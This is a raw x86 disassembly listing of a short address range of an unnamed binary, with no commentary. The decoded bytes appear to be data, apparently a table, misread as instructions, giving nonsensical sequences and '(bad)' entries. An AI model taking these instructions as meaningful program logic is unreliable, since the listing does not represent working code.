  43b626:	push   ecx
  43b627:	cmp    eax,DWORD PTR [edx-0x41c44fc5]
  43b62d:	cmp    edx,eax
  43b62f:	cmp    ebp,edi
  43b631:	cmp    ebp,DWORD PTR [esp+edi*1]
  43b634:	cmp    bh,BYTE PTR [esp+ecx*2]
  43b637:	cmp    al,0x6b
  43b639:	cmp    al,0xab
  43b63b:	cmp    al,0xb4
  43b63d:	cmp    al,0xd8
  43b63f:	cmp    al,0xf7
  43b641:	cmp    al,0x16
  43b643:	cmp    eax,0x3da73d8d
  43b648:	mov    edi,0xf53dd93d
  43b64d:	cmp    eax,0x3e2d3e11
  43b652:	jl     0x43b692
  43b654:	mov    edi,DWORD PTR [esi]
  43b656:	cwde   
  43b657:	mov    al,ds:0xbb3eb13e
  43b65d:	ds leave 
  43b65f:	fstp   TBYTE PTR ds:[esi]
  43b662:	in     eax,dx
  43b663:	ds repz add bh,BYTE PTR ds:[edi]
  43b668:	or     al,0x3f
  43b66a:	sbb    BYTE PTR [edi],bh
  43b66c:	sub    al,0x3f
  43b66e:	cmp    BYTE PTR [edi],bh
  43b670:	dec    ebp
  43b671:	aas    
  43b672:	push   ebx
  43b673:	aas    
  43b674:	pop    esp
  43b675:	aas    
  43b676:	fs aas 
  43b678:	jbe    0x43b6b9
  43b67a:	test   DWORD PTR [edi],edi
  43b67c:	mov    ds:0xc93fc03f,eax
  43b681:	aas    
  43b682:	jecxz  0x43b6c3
  43b684:	idiv   BYTE PTR [edi]
  43b686:	add    BYTE PTR [eax],al
  43b688:	add    BYTE PTR [eax+0x1480000],al
  43b68e:	add    BYTE PTR [eax],al
  43b690:	adc    al,0x30
  43b692:	sub    eax,0x40303730
  43b697:	xor    BYTE PTR [eax+0x30],dl
  43b69a:	popa   
  43b69b:	xor    BYTE PTR [esi+0x30],dh
  43b69e:	xchg   esp,eax
  43b69f:	xor    BYTE PTR [eax-0x4bcf53d0],ah
  43b6a5:	xor    BYTE PTR [edx-0x2cf09d0],bh
  43b6ab:	xor    BYTE PTR [ecx+esi*1],cl
  43b6ae:	sbb    DWORD PTR [ecx],esi
  43b6b0:	pop    ds
  43b6b1:	xor    DWORD PTR [ecx],ebp
  43b6b3:	xor    DWORD PTR [edi],ebp
  43b6b5:	xor    DWORD PTR [eax+0x31],eax
  43b6b8:	inc    esi
  43b6b9:	xor    DWORD PTR [eax+0x31],edx
  43b6bc:	pop    ebx
  43b6bd:	xor    DWORD PTR [ecx+esi*1+0x31b531ad],edx
  43b6c4:	shl    DWORD PTR [ecx],0xce
  43b6c7:	xor    ebx,esi
  43b6c9:	xor    DWORD PTR [ebx],ecx
  43b6cb:	xor    bl,BYTE PTR [eax]
  43b6cd:	xor    bl,BYTE PTR [esi]
  43b6cf:	xor    ch,BYTE PTR [eax]
  43b6d1:	xor    dh,BYTE PTR [ebx]
  43b6d3:	xor    al,BYTE PTR [esi+0x32]
  43b6d6:	push   ebx
  43b6d7:	xor    bl,BYTE PTR [edx+esi*1-0x7b]
  43b6db:	xor    dl,BYTE PTR [ebx-0x61cc78ce]
  43b6e1:	xor    esi,DWORD PTR [esi-0x6cc23cd]
  43b6e7:	xor    edi,edi
  43b6e9:	xor    ecx,DWORD PTR [ecx]
  43b6eb:	xor    al,0x14
  43b6ed:	xor    al,0x27
  43b6ef:	xor    al,0x5c
  43b6f1:	xor    al,0x61
  43b6f3:	xor    al,0x84
  43b6f5:	xor    al,0xe9
  43b6f7:	xor    al,0x33
  43b6f9:	xor    eax,0x35c535a7
  43b6fe:	retf   
  43b6ff:	xor    eax,0x35e035d5
  43b704:	repz xor eax,0x360635ff
  43b70a:	dec    esi
  43b70b:	ss push esp
  43b70d:	ss pop esi
  43b70f:	imul   esi,DWORD PTR ss:[esi],0x3693367c
  43b716:	push   cs
  43b717:	aaa    
  43b718:	push   ebx
  43b719:	aaa    
  43b71a:	xchg   ecx,eax
  43b71b:	aaa    
  43b71c:	test   eax,0xb737b037
  43b721:	aaa    
  43b722:	add    BYTE PTR [eax],bh
  43b724:	push   es
  43b725:	cmp    BYTE PTR [ebx],cl
  43b727:	cmp    BYTE PTR [ebx+0x38],al
  43b72a:	dec    ecx
  43b72b:	cmp    BYTE PTR [ecx+0x38],bl
  43b72e:	mov    WORD PTR [eax],?
  43b730:	xchg   ecx,eax
  43b731:	cmp    BYTE PTR [eax-0x5bc760c8],bl
  43b737:	cmp    bh,bl
  43b739:	cmp    bl,dh
  43b73b:	cmp    BYTE PTR ds:0x52394b39,bl
  43b741:	cmp    DWORD PTR [ecx+0x39],esp
  43b744:	imul   edi,DWORD PTR [ecx],0x398e397c
  43b74a:	test   al,0x39
  43b74c:	mov    eax,0xd539c039
  43b751:	cmp    ecx,ebp
  43b753:	cmp    edi,ebp
  43b755:	cmp    ecx,edi
  43b757:	cmp    DWORD PTR [edx+edi*1],ecx
  43b75a:	push   ebp
  43b75b:	cmp    bl,BYTE PTR [edi+0x3a]
  43b75e:	cmp    cl,BYTE PTR gs:[eax-0x4bc565c6]
  43b765:	cmp    bh,BYTE PTR [edx-0x2bc538c6]
  43b76b:	cmp    dh,bh
  43b76d:	cmp    dl,BYTE PTR ds:0xea3bca3b
  43b773:	cmp    edi,esi
  43b775:	cmp    ecx,DWORD PTR [esp+edi*1]
  43b778:	push   ds
  43b779:	cmp    al,0x33
  43b77b:	cmp    al,0x50
  43b77d:	cmp    al,0x60
  43b77f:	cmp    al,0x67
  43b781:	cmp    al,0x88
  43b783:	cmp    al,0x96
  43b785:	cmp    al,0xec
  43b787:	cmp    al,0x3d
  43b789:	cmp    eax,0x3d783d5b
  43b78e:	test   DWORD PTR ds:0x3e293de9,edi
  43b794:	popa   
  43b795:	xchg   BYTE PTR ds:[esi],bh
  43b798:	mov    edi,DWORD PTR [esi]
  43b79a:	mov    ds:0xec3ecb3e,eax
  43b79f:	ds repnz add BYTE PTR ds:[edi],bh
  43b7a4:	adc    eax,0x223f1b3f
  43b7a9:	aas    
  43b7aa:	sub    DWORD PTR [edi],edi
  43b7ac:	xor    bh,BYTE PTR [edi]
  43b7ae:	aaa    
  43b7af:	aas    
  43b7b0:	cmp    eax,0x483f423f
  43b7b5:	aas    
  43b7b6:	dec    ebp
  43b7b7:	aas    
  43b7b8:	pop    eax
  43b7b9:	aas    
  43b7ba:	arpl   WORD PTR [edi],di
  43b7bc:	imul   edi,DWORD PTR [edi],0x3f953f8a
  43b7c2:	fwait
  43b7c3:	aas    
  43b7c4:	mov    dl,0x3f
  43b7c6:	sar    DWORD PTR [edi],0xc9
  43b7c9:	aas    
  43b7ca:	sar    BYTE PTR [edi],1
  43b7cc:	idiv   DWORD PTR [edi]
  43b7ce:	add    BYTE PTR [eax],al
  43b7d0:	add    BYTE PTR [eax+0x1240000],dl
  43b7d6:	add    BYTE PTR [eax],al
  43b7d8:	add    al,0x30
  43b7da:	or     esi,DWORD PTR [eax]
  43b7dc:	adc    eax,0x28301b30
  43b7e1:	xor    BYTE PTR [esi],ch
  43b7e3:	xor    BYTE PTR [eax],bh
  43b7e5:	xor    BYTE PTR [ebx+0x30],al
  43b7e8:	push   esi
  43b7e9:	xor    BYTE PTR [edx+0x30],ah
  43b7ec:	test   BYTE PTR [eax],dh
  43b7ee:	xchg   edi,eax
  43b7ef:	xor    dl,cl
  43b7f1:	xor    ah,dh
  43b7f3:	xor    BYTE PTR [edi],dl
  43b7f5:	xor    DWORD PTR ds:0x3a312d31,ebx
  43b7fb:	xor    DWORD PTR [edx+0x31],ecx
  43b7fe:	pop    esp
  43b7ff:	xor    DWORD PTR [ecx+0x31],ebp
  43b802:	outs   dx,DWORD PTR ds:[esi]
  43b803:	xor    DWORD PTR [ebx-0x61ce67cf],eax
  43b809:	xor    eax,ecx
  43b80b:	xor    ecx,ebx
  43b80d:	xor    eax,esp
  43b80f:	xor    esi,esi
  43b811:	xor    DWORD PTR [ebx],eax
  43b813:	xor    bl,BYTE PTR [edx+esi*1]
  43b816:	and    al,0x32
  43b818:	sub    DWORD PTR [edx],esi
  43b81a:	das    
  43b81b:	xor    bh,BYTE PTR [edx+esi*1]
  43b81e:	push   esp
  43b81f:	xor    ah,BYTE PTR [ebx+0x32]
  43b822:	jp     0x43b856
  43b824:	xchg   DWORD PTR [edx],esi
  43b826:	call   0xe332:0xd732c732
  43b82d:	xor    ch,cl
  43b82f:	xor    al,BYTE PTR [edi]
  43b831:	xor    edx,DWORD PTR [edx]
  43b833:	xor    edx,DWORD PTR [edi]
  43b835:	xor    esp,DWORD PTR [ebx+esi*1]
  43b838:	sub    esi,DWORD PTR [ebx]
  43b83a:	aaa    
  43b83b:	xor    ebx,DWORD PTR [ecx+0x33]
  43b83e:	pop    edi
  43b83f:	xor    esp,DWORD PTR [ebx+esi*1+0x6b]
  43b843:	xor    eax,DWORD PTR [edi-0x43cc72cd]
  43b849:	xor    eax,edx
  43b84b:	xor    esp,ebx
  43b84d:	xor    edx,DWORD PTR [esi]
  43b84f:	xor    al,0x1d
  43b851:	xor    al,0x2d
  43b853:	xor    al,0x36
  43b855:	xor    al,0x4f
  43b857:	xor    al,0x6a
  43b859:	xor    al,0x74
  43b85b:	xor    al,0x8d
  43b85d:	xor    al,0x93
  43b85f:	xor    al,0x9e
  43b861:	xor    al,0xb7
  43b863:	xor    al,0xcd
  43b865:	xor    al,0xd7
  43b867:	xor    al,0xf6
  43b869:	xor    al,0xfd
  43b86b:	xor    al,0x15
  43b86d:	xor    eax,0x35783571
  43b872:	push   ebx
  43b873:	ss jle 0x43b8ac
  43b876:	test   BYTE PTR [esi],dh
  43b878:	mov    DWORD PTR [esi],esi
  43b87a:	les    esi,FWORD PTR [esi]
  43b87c:	shl    DWORD PTR [esi],cl
  43b87e:	loope  0x43b8b6
  43b880:	std    
  43b881:	ss and al,0x37
  43b884:	inc    edi
  43b885:	aaa    
  43b886:	push   eax
  43b887:	aaa    
  43b888:	fs aaa 
  43b88a:	xchg   edx,eax
  43b88b:	aaa    
  43b88c:	cdq    
  43b88d:	aaa    
  43b88e:	stos   DWORD PTR es:[edi],eax
  43b88f:	aaa    
  43b890:	mov    ch,0x37
  43b892:	inc    esp
  43b893:	cmp    BYTE PTR [esi+0xd390638],dh
  43b899:	cmp    DWORD PTR [eax],edi
  43b89b:	cmp    DWORD PTR [edx+0x39],edx
  43b89e:	ins    BYTE PTR es:[edi],dx
  43b89f:	cmp    DWORD PTR [ebx-0x5fc664c7],edx
  43b8a5:	cmp    esi,eax
  43b8a7:	cmp    edx,esp
  43b8a9:	cmp    DWORD PTR [eax],eax
  43b8ab:	cmp    cl,BYTE PTR ds:0x263a143a
  43b8b1:	cmp    bh,BYTE PTR [eax]
  43b8b3:	cmp    ah,BYTE PTR [ebx+0x3a]
  43b8b6:	cdq    
  43b8b7:	cmp    esi,edi
  43b8b9:	cmp    edx,DWORD PTR [eax]
  43b8bb:	cmp    al,0x16
  43b8bd:	cmp    al,0x28
  43b8bf:	cmp    al,0x3c
  43b8c1:	cmp    al,0x81
  43b8c3:	cmp    al,0xa8
  43b8c5:	cmp    al,0xd0
  43b8c7:	cmp    al,0xd7
  43b8c9:	cmp    al,0xf9
  43b8cb:	cmp    al,0x2a
  43b8cd:	cmp    eax,0x3d903d31
  43b8d2:	or     edi,DWORD PTR [esi]
  43b8d4:	pop    esi
  43b8d5:	mov    BYTE PTR ds:[esi],bh
  43b8d8:	fwait
  43b8d9:	mov    ds:0xfd3ef63e,eax
  43b8df:	ds or  al,0x3f
  43b8e2:	and    eax,0x393f313f
  43b8e7:	aas    
  43b8e8:	lods   al,BYTE PTR ds:[esi]
  43b8e9:	aas    
  43b8ea:	mov    ah,0x3f
  43b8ec:	sar    DWORD PTR [edi],0xd3
  43b8ef:	aas    
  43b8f0:	cli    
  43b8f1:	aas    
  43b8f2:	add    BYTE PTR [eax],al
  43b8f4:	add    BYTE PTR [eax+0x17c0000],ah
  43b8fa:	add    BYTE PTR [eax],al
  43b8fc:	add    dh,BYTE PTR [eax]
  43b8fe:	xor    DWORD PTR [eax],esi
  43b900:	cmp    DWORD PTR [eax],esi
  43b902:	push   edx
  43b903:	xor    BYTE PTR [eax+esi*1+0x6b],ah
  43b907:	xor    BYTE PTR [eax+esi*1-0x7a],dh
  43b90b:	xor    BYTE PTR [eax-0x58cf5dd0],bl
  43b911:	xor    BYTE PTR [eax-0x42cf49d0],dh
  43b917:	xor    dl,al
  43b919:	xor    al,cl
  43b91b:	xor    ch,cl
  43b91d:	xor    bl,dl
  43b91f:	xor    cl,bl
  43b921:	xor    cl,ah
  43b923:	xor    ch,ch
  43b925:	xor    cl,bh
  43b927:	xor    BYTE PTR [ecx],cl
  43b929:	xor    DWORD PTR ds:0x2d312331,ebx
  43b92f:	xor    DWORD PTR [ecx+esi*1+0x52],ecx
  43b933:	xor    DWORD PTR [edx+0x31],ebx
  43b936:	pusha  
  43b937:	xor    DWORD PTR [ecx+0x31],edi
  43b93a:	mov    BYTE PTR [ecx],dh
  43b93c:	popf   
  43b93d:	xor    esp,eax
  43b93f:	xor    DWORD PTR [ebx],esp
  43b941:	xor    dl,BYTE PTR [ecx-0x11cd69ce]
  43b947:	xor    dh,dl
  43b949:	xor    bh,bh
  43b94b:	xor    dl,BYTE PTR [ecx]
  43b94d:	xor    eax,DWORD PTR [edi+0x33]
  43b950:	pop    edx
  43b951:	xor    eax,DWORD PTR [ecx-0x54cc64cd]
  43b957:	xor    ebp,esp
  43b959:	xor    esi,edx
  43b95b:	xor    ebp,DWORD PTR [esi]
  43b95d:	xor    al,0x3d
  43b95f:	xor    al,0x65
  43b961:	xor    al,0xae
  43b963:	xor    al,0xed
  43b965:	xor    al,0x0
  43b967:	xor    eax,0x353d3521
  43b96c:	inc    esp
  43b96d:	xor    eax,0x35b035a9
  43b972:	les    esi,FWORD PTR ds:0x360935f7
  43b978:	sbb    BYTE PTR [esi],dh
  43b97a:	ss ss inc ebx
  43b97d:	mov    BYTE PTR ss:[esi],dh
  43b980:	les    esi,FWORD PTR [esi]
  43b982:	adc    esi,DWORD PTR [edi]
  43b984:	sbb    dh,BYTE PTR [edi]
  43b986:	pop    ebx
  43b987:	aaa    
  43b988:	imul   esi,DWORD PTR [edi],0x379c377c
  43b98e:	mov    dh,0x37
  43b990:	enter  0xd737,0x37
  43b994:	push   cs
  43b995:	cmp    BYTE PTR [esi+0x38],cl
  43b998:	jp     0x43b9d2
  43b99a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b99b:	cmp    BYTE PTR [ebx-0x11c72cc8],bh
  43b9a1:	cmp    BYTE PTR [edi],dh
  43b9a3:	cmp    DWORD PTR [eax+0x39],esi
  43b9a6:	xchg   BYTE PTR [ecx],bh
  43b9a8:	stos   DWORD PTR es:[edi],eax
  43b9a9:	cmp    edx,ebx
  43b9ab:	cmp    ebx,esi
  43b9ad:	cmp    esi,edi
  43b9af:	cmp    DWORD PTR [ecx],ebx
  43b9b1:	cmp    ah,BYTE PTR ds:0x5e3a303a
  43b9b7:	cmp    dh,BYTE PTR [edx+0x3a]
  43b9ba:	jge    0x43b9f6
  43b9bc:	xchg   ecx,eax
  43b9bd:	cmp    ah,BYTE PTR [ecx-0x4bc553c6]
  43b9c3:	cmp    cl,ah
  43b9c5:	cmp    dh,ch
  43b9c7:	cmp    bh,ch
  43b9c9:	cmp    al,BYTE PTR [edx]
  43b9cb:	cmp    edx,DWORD PTR [esi]
  43b9cd:	cmp    ebx,DWORD PTR [ebx]
  43b9cf:	cmp    esp,DWORD PTR ds:0x313b2b3b
  43b9d5:	cmp    eax,DWORD PTR [edx+0x3b]
  43b9d8:	pop    esp
  43b9d9:	cmp    edi,DWORD PTR [ebp+0x3b]
  43b9dc:	xchg   DWORD PTR [ebx],edi
  43b9de:	lea    edi,[ebx]
  43b9e0:	xchg   ebx,eax
  43b9e1:	cmp    esi,DWORD PTR [ebx+edi*1+0x3bc93bbd]
  43b9e8:	xlat   BYTE PTR ds:[ebx]
  43b9e9:	cmp    esp,edx
  43b9eb:	cmp    esi,edi
  43b9ed:	cmp    edi,ebp
  43b9ef:	cmp    ecx,DWORD PTR [esi]
  43b9f1:	cmp    al,0x35
  43b9f3:	cmp    al,0x51
  43b9f5:	cmp    al,0x57
  43b9f7:	cmp    al,0x60
  43b9f9:	cmp    al,0x66
  43b9fb:	cmp    al,0x6e
  43b9fd:	cmp    al,0x9b
  43b9ff:	cmp    al,0xa2
  43ba01:	cmp    al,0xb9
  43ba03:	cmp    al,0xc4
  43ba05:	cmp    al,0xdd
  43ba07:	cmp    al,0xef
  43ba09:	cmp    al,0x5
  43ba0b:	cmp    eax,0x3d373d24
  43ba10:	inc    eax
  43ba11:	cmp    eax,0x3d603d5b
  43ba16:	ja     0x43ba55
  43ba18:	jl     0x43ba57
  43ba1a:	test   BYTE PTR ds:0x3d9b3d95,bh
  43ba20:	mov    al,ds:0xb33da83d
  43ba25:	cmp    eax,0x3dd53dc3
  43ba2a:	fstp   TBYTE PTR ds:0x3de73de1
  43ba30:	cmc    
  43ba31:	cmp    eax,0x3e053dfd
  43ba36:	adc    al,0x3e
  43ba38:	push   eax
  43ba39:	ds pop edi
  43ba3b:	ds jge 0x43ba7c
  43ba3e:	lea    edi,[esi]
  43ba40:	xchg   edx,eax
  43ba41:	ds int 0x3e
  43ba44:	fidivr DWORD PTR [esi]
  43ba46:	loopne 0x43ba86
  43ba48:	jmp    0x43ba88
  43ba4a:	icebp  
  43ba4b:	idiv   DWORD PTR ds:[esi]
  43ba4e:	add    al,0x3f
  43ba50:	or     edi,DWORD PTR [edi]
  43ba52:	push   ss
  43ba53:	aas    
  43ba54:	inc    ecx
  43ba55:	aas    
  43ba56:	dec    edx
  43ba57:	aas    
  43ba58:	push   ecx
  43ba59:	aas    
  43ba5a:	push   ebp
  43ba5b:	aas    
  43ba5c:	pop    ebx
  43ba5d:	aas    
  43ba5e:	pop    edi
  43ba5f:	aas    
  43ba60:	gs aas 
  43ba62:	js     0x43baa3
  43ba64:	mov    WORD PTR [edi],?
  43ba66:	leave  
  43ba67:	aas    
  43ba68:	fdivr  QWORD PTR [edi]
  43ba6a:	repnz aas 
  43ba6c:	cld    
  43ba6d:	aas    
  43ba6e:	add    BYTE PTR [eax],al
  43ba70:	add    BYTE PTR [eax+0x1a00000],dh
  43ba76:	add    BYTE PTR [eax],al
  43ba78:	push   es
  43ba79:	xor    BYTE PTR [esi],cl
  43ba7b:	xor    BYTE PTR ds:0x31302c30,bl
  43ba81:	xor    BYTE PTR [edi],dh
  43ba83:	xor    BYTE PTR [esi],bh
  43ba85:	xor    BYTE PTR [eax+0x30],cl
  43ba88:	dec    edi
  43ba89:	xor    BYTE PTR [edx+0x30],bl
  43ba8c:	mov    WORD PTR [eax],?
  43ba8e:	xchg   esi,eax
  43ba8f:	xor    BYTE PTR [ecx-0x48cf54d0],ah
  43ba95:	xor    bl,al
  43ba97:	xor    dh,cl
  43ba99:	xor    dl,bl
  43ba9b:	xor    dh,ah
  43ba9d:	xor    cl,dh
  43ba9f:	xor    ch,bh
  43baa1:	xor    BYTE PTR [ecx],cl
  43baa3:	xor    DWORD PTR [ecx+esi*1],edx
  43baa6:	and    BYTE PTR [ecx],dh
  43baa8:	sub    al,0x31
  43baaa:	inc    esp
  43baab:	xor    DWORD PTR [ecx+esi*1+0x77],esp
  43baaf:	xor    DWORD PTR [edi-0x5cce62cf],edx
  43bab5:	xor    esp,eax
  43bab7:	xor    ebp,ecx
  43bab9:	xor    ecx,ebx
  43babb:	xor    esp,esp
  43babd:	xor    DWORD PTR [esi],ebx
  43babf:	xor    ah,BYTE PTR [esi]
  43bac1:	xor    ch,BYTE PTR [edi]
  43bac3:	xor    dh,BYTE PTR [esi]
  43bac5:	xor    dl,BYTE PTR [edx+esi*1+0x59]
  43bac9:	xor    ah,BYTE PTR [ebx+0x32]
  43bacc:	push   0x32
  43bace:	xchg   DWORD PTR [edx],esi
  43bad0:	xchg   esp,eax
  43bad1:	xor    al,ah
  43bad3:	xor    ah,cl
  43bad5:	xor    bh,ch
  43bad7:	xor    dl,BYTE PTR [ebx]
  43bad9:	xor    esp,DWORD PTR [edi]
  43badb:	xor    eax,DWORD PTR [ecx+0x33]
  43bade:	xlat   BYTE PTR ds:[ebx]
  43badf:	xor    edi,esi
  43bae1:	xor    ecx,DWORD PTR [eax]
  43bae3:	xor    al,0x22
  43bae5:	xor    al,0x3f
  43bae7:	xor    al,0x5c
  43bae9:	xor    al,0x66
  43baeb:	xor    al,0x7c
  43baed:	xor    al,0x86
  43baef:	xor    al,0x9c
  43baf1:	xor    al,0xa6
  43baf3:	xor    al,0xbd
  43baf5:	xor    al,0xc8
  43baf7:	xor    al,0xdf
  43baf9:	xor    al,0xe9
  43bafb:	xor    al,0xf8
  43bafd:	xor    al,0xfd
  43baff:	xor    al,0x9
  43bb01:	xor    eax,0x35503523
  43bb06:	xor    ax,0x3577
  43bb0a:	mov    DWORD PTR ds:0x35b03598,esi
  43bb10:	mov    esi,0xf035d035
  43bb15:	xor    eax,0x360035f6
  43bb1a:	push   es
  43bb1b:	adc    DWORD PTR ss:[esi],esi
  43bb1e:	inc    esp
  43bb1f:	ss dec edi
  43bb21:	ss fs ss jns 0x43bb5c
  43bb26:	xchg   ecx,eax
  43bb27:	ss lahf 
  43bb29:	ss mov bh,0x36
  43bb2c:	mov    esp,0xc936c336
  43bb31:	ss out 0x36,al
  43bb34:	in     eax,dx
  43bb35:	ss cmc 
  43bb37:	ss sbb eax,0x38372337
  43bb3d:	aaa    
  43bb3e:	ds aaa 
  43bb40:	dec    edx
  43bb41:	aaa    
  43bb42:	push   eax
  43bb43:	aaa    
  43bb44:	pop    esp
  43bb45:	aaa    
  43bb46:	outs   dx,DWORD PTR ds:[esi]
  43bb47:	aaa    
  43bb48:	jp     0x43bb81
  43bb4a:	xor    BYTE PTR [edi],0x99
  43bb4d:	aaa    
  43bb4e:	mov    al,0x37
  43bb50:	mov    ebx,0xed37d237
  43bb55:	aaa    
  43bb56:	or     BYTE PTR [eax],bh
  43bb58:	daa    
  43bb59:	cmp    BYTE PTR [ecx],dh
  43bb5b:	cmp    BYTE PTR [edi],dh
  43bb5d:	cmp    BYTE PTR [eax+edi*1],bh
  43bb60:	dec    edx
  43bb61:	cmp    BYTE PTR [eax+0x38],dl
  43bb64:	push   esi
  43bb65:	cmp    BYTE PTR [esi+0x38],bl
  43bb68:	push   0x82387c38
  43bb6d:	cmp    BYTE PTR [ebp-0x61c76cc8],cl
  43bb73:	cmp    BYTE PTR [edx-0x24c737c8],ch
  43bb79:	cmp    dl,bh
  43bb7b:	cmp    BYTE PTR ds:0x4b391539,cl
  43bb81:	cmp    DWORD PTR [ebx+0x39],esp
  43bb84:	jl     0x43bbbf
  43bb86:	idiv   BYTE PTR [ecx]
  43bb88:	cmp    edi,DWORD PTR [edx]
  43bb8a:	inc    esi
  43bb8b:	cmp    cl,BYTE PTR [ebp+0x3a]
  43bb8e:	pop    esp
  43bb8f:	cmp    ah,BYTE PTR [ebp+0x3a]
  43bb92:	fwait
  43bb93:	cmp    dh,BYTE PTR [edi-0x21c543c6]
  43bb99:	cmp    ah,ch
  43bb9b:	cmp    bh,al
  43bb9d:	cmp    bh,bh
  43bb9f:	cmp    al,BYTE PTR [ebp-0x5ac466c5]
  43bba5:	cmp    edx,eax
  43bba7:	cmp    edx,DWORD PTR [edx]
  43bba9:	cmp    al,0x17
  43bbab:	cmp    al,0x62
  43bbad:	cmp    al,0x95
  43bbaf:	cmp    al,0xad
  43bbb1:	cmp    al,0xbf
  43bbb3:	cmp    al,0xc6
  43bbb5:	cmp    al,0xe3
  43bbb7:	cmp    al,0xeb
  43bbb9:	cmp    al,0xfb
  43bbbb:	cmp    al,0xa
  43bbbd:	cmp    eax,0x3d393d32
  43bbc2:	aas    
  43bbc3:	cmp    eax,0x3d843d47
  43bbc8:	mov    bh,BYTE PTR ds:0x3dc93dc3
  43bbce:	sar    BYTE PTR ds:0x3e0a3dfe,cl
  43bbd4:	pop    ss
  43bbd5:	ds aaa 
  43bbd7:	ds aas 
  43bbd9:	ds inc edi
  43bbdb:	ds push esp
  43bbdd:	ds pop edx
  43bbdf:	ds data16 ds mov dh,0x3e
  43bbe4:	iret   
  43bbe5:	ds loopne 0x43bc26
  43bbe8:	clc    
  43bbe9:	or     BYTE PTR ds:[edi],bh
  43bbec:	and    al,0x3f
  43bbee:	das    
  43bbef:	aas    
  43bbf0:	xor    eax,0x593f463f
  43bbf5:	aas    
  43bbf6:	outs   dx,BYTE PTR ds:[esi]
  43bbf7:	aas    
  43bbf8:	ja     0x43bc39
  43bbfa:	cmp    BYTE PTR [edi],0x88
  43bbfd:	aas    
  43bbfe:	xchg   ebp,eax
  43bbff:	aas    
  43bc00:	mov    eax,ds:0xb63fa83f
  43bc05:	aas    
  43bc06:	enter  0xcf3f,0x3f
  43bc0a:	fidivr DWORD PTR [edi]
  43bc0c:	in     eax,0x3f
  43bc0e:	add    BYTE PTR [eax],al
  43bc10:	add    al,al
  43bc12:	add    BYTE PTR [eax],al
  43bc14:	pushf  
  43bc15:	add    DWORD PTR [eax],eax
  43bc17:	add    BYTE PTR [ecx],cl
  43bc19:	xor    BYTE PTR [edi],cl
  43bc1b:	xor    BYTE PTR [edx],bl
  43bc1d:	xor    BYTE PTR [eax],ah
  43bc1f:	xor    BYTE PTR [eax+esi*1],ch
  43bc22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bc23:	xor    BYTE PTR [ebx-0x18cf20d0],dh
  43bc29:	xor    BYTE PTR [esi],al
  43bc2b:	xor    DWORD PTR ds:0x2a311b31,ecx
  43bc31:	xor    DWORD PTR [edx+0x31],ecx
  43bc34:	push   eax
  43bc35:	xor    DWORD PTR [ecx+0x31],ebx
  43bc38:	pusha  
  43bc39:	xor    DWORD PTR [ecx+esi*1-0x80],esi
  43bc3d:	xor    eax,eax
  43bc3f:	xor    edi,eax
  43bc41:	xor    edx,edx
  43bc43:	xor    ebx,ebp
  43bc45:	xor    ecx,edi
  43bc47:	xor    DWORD PTR ds:0x26320f32,eax
  43bc4d:	xor    dh,BYTE PTR [ecx]
  43bc4f:	xor    bh,BYTE PTR [ecx]
  43bc51:	xor    al,BYTE PTR [ebp+0x32]
  43bc54:	push   esp
  43bc55:	xor    bl,BYTE PTR [esi+0x32]
  43bc58:	xor    ch,BYTE PTR [bx+0x32]
  43bc5c:	ja     0x43bc90
  43bc5e:	test   BYTE PTR [edx],dh
  43bc60:	mov    WORD PTR [edx],?
  43bc62:	xchg   edi,eax
  43bc63:	xor    ah,BYTE PTR [eax-0x4bcd55ce]
  43bc69:	xor    al,al
  43bc6b:	xor    cl,dl
  43bc6d:	xor    ah,cl
  43bc6f:	xor    ch,ah
  43bc71:	xor    dh,ah
  43bc73:	xor    al,BYTE PTR [eax]
  43bc75:	xor    ecx,DWORD PTR [ebx+esi*1]
  43bc78:	pop    ss
  43bc79:	xor    esp,DWORD PTR [eax]
  43bc7b:	xor    ebp,DWORD PTR [edx]
  43bc7d:	xor    edi,DWORD PTR [eax]
  43bc7f:	xor    eax,DWORD PTR [ecx+0x33]
  43bc82:	dec    eax
  43bc83:	xor    ecx,DWORD PTR [esi+0x33]
  43bc86:	pop    ebp
  43bc87:	xor    esp,DWORD PTR [ebx+0x33]
  43bc8a:	imul   esi,DWORD PTR [ebx],0x76
  43bc8d:	xor    edi,DWORD PTR [esi+0x33]
  43bc90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bc91:	xor    ebp,DWORD PTR [ebx-0x35cc4ccd]
  43bc97:	xor    edx,ebp
  43bc99:	xor    esp,ebp
  43bc9b:	xor    ebp,esp
  43bc9d:	xor    edi,ebp
  43bc9f:	xor    eax,DWORD PTR [ebx]
  43bca1:	xor    al,0xb
  43bca3:	xor    al,0x10
  43bca5:	xor    al,0x15
  43bca7:	xor    al,0x20
  43bca9:	xor    al,0x29
  43bcab:	xor    al,0x3b
  43bcad:	xor    al,0x46
  43bcaf:	xor    al,0x4d
  43bcb1:	xor    al,0x55
  43bcb3:	xor    al,0x6a
  43bcb5:	xor    al,0x76
  43bcb7:	xor    al,0x82
  43bcb9:	xor    al,0x8d
  43bcbb:	xor    al,0x9a
  43bcbd:	xor    al,0xb4
  43bcbf:	xor    al,0xc6
  43bcc1:	xor    al,0xcf
  43bcc3:	xor    al,0xe0
  43bcc5:	xor    al,0xe9
  43bcc7:	xor    al,0xf2
  43bcc9:	xor    al,0x6
  43bccb:	xor    eax,0x35493531
  43bcd0:	jle    0x43bd07
  43bcd2:	nop
  43bcd3:	xor    eax,0x35b1359f
  43bcd8:	shl    BYTE PTR ds:0x360635cd,0x3c
  43bcdf:	ss push 0x36
  43bce2:	ja     0x43bd1a
  43bce4:	(bad)  
  43bce5:	ss xchg esi,eax
  43bce7:	ss ret 
  43bce9:	fdiv   QWORD PTR ss:[esi]
  43bcec:	cli    
  43bced:	sbb    BYTE PTR ss:[edi],dh
  43bcf0:	and    BYTE PTR [edi],dh
  43bcf2:	inc    ebp
  43bcf3:	aaa    
  43bcf4:	push   esi
  43bcf5:	aaa    
  43bcf6:	pop    edi
  43bcf7:	aaa    
  43bcf8:	nop
  43bcf9:	aaa    
  43bcfa:	test   eax,0x1137c937
  43bcff:	cmp    BYTE PTR [edi+0x38],al
  43bd02:	arpl   WORD PTR [eax],di
  43bd04:	cmp    BYTE PTR [eax],0x8f
  43bd07:	cmp    BYTE PTR [esi-0x3dc747c8],dl
  43bd0d:	cmp    al,ah
  43bd0f:	cmp    ch,ah
  43bd11:	cmp    al,dh
  43bd13:	cmp    dl,bh
  43bd15:	cmp    BYTE PTR [edx],dh
  43bd17:	cmp    DWORD PTR [edi+0x39],ebx
